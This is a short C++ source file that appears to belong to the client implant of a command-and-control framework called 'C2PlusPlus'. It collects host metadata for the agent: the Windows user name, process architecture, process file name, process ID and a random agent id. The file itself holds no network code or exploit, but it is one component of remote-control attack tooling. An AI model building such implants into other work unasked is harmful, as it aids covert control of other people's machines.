#include "Metadata.h"
#include <winsock.h>
#include <C2PlusPlus/Module.h>

Client::Metadata::Metadata()
{
	GetCurrentUserName();
	GetCurrentProccessInfo();
	id = C2PlusPlus::Module::Random();
}

std::string getFileName(const std::string& s)
{
	char sep = '/';

#ifdef _WIN32
	sep = '\\';
#endif

	size_t i = s.rfind(sep, s.length());
	if (i != std::string::npos) {
		return(s.substr(i + 1, s.length() - i));
	}
	return "";
}

void Client::Metadata::GetCurrentUserName()
{
	char acUsername[100];
	DWORD nUserName = sizeof(acUsername);
	if (GetUserNameA(acUsername, &nUserName))
		username = acUsername;
}

void Client::Metadata::GetCurrentProccessInfo()
{
	// Check if process is 64 bits
	typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;
	
	BOOL bIsWow64 = FALSE;
	HANDLE handle = GetCurrentProcess();

	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

	if (NULL != fnIsWow64Process)
	{
		if (!fnIsWow64Process(handle, &bIsWow64))
		{
			//handle error
		}
	}
	is64 = bIsWow64;

	// Get current process PATH
	char acProcessname[MAX_PATH];
	if (GetModuleFileNameA(0, acProcessname, MAX_PATH))
		processName = acProcessname; // Process PATH

	processName = getFileName(processName);

	// Get ProcessID
	processId = GetCurrentProcessId();
}
